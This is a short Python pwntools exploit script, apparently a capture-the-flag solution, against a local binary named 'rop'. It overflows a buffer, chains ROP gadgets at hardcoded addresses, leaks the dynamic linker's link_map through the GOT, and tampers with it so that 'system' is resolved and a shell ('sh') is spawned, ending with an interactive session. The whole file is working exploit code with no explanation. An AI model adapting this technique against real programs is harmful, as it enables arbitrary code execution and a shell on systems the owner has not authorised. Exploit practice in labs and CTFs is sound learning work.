#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

r = process("./rop")
#gdb.attach(proc.pidof(r)[0])

r.recvlines(2)

got1 = 0x601008
puts_plt = 0x4004b0
gets_plt = 0x4004d0
fflush_plt_1 = 0x4004e6
pop_rdi = 0x4006a3
pop_rbp = 0x400560
leave = 0x40063e
buf = 0x00601500
data = 0x00601e00

offset = 0

def sendrop(rop):
    global offset

    payload = rop + flat(
                        pop_rdi, buf + offset, gets_plt,
                        pop_rbp, buf + offset - 0x8, leave
                    )
    offset += len(rop) + 6 * 0x8
    
    r.sendline(payload)

sendrop(b'A' * 88 + flat(
    pop_rdi, got1, puts_plt
))
link_map = int.from_bytes(r.recvline().strip(), 'little')
print("link_map : ", hex(link_map))

sendrop(flat(
    pop_rdi, data, gets_plt,
    pop_rdi, link_map + 0x8 * 13, gets_plt,
    pop_rdi, data + 0x18, fflush_plt_1, 
))

r.sendline(flat(5, data + 0x10 - 0x10) + b"system\x00\x00" + b"sh")
r.sendline((data).to_bytes(3, 'little'))

r.interactive()
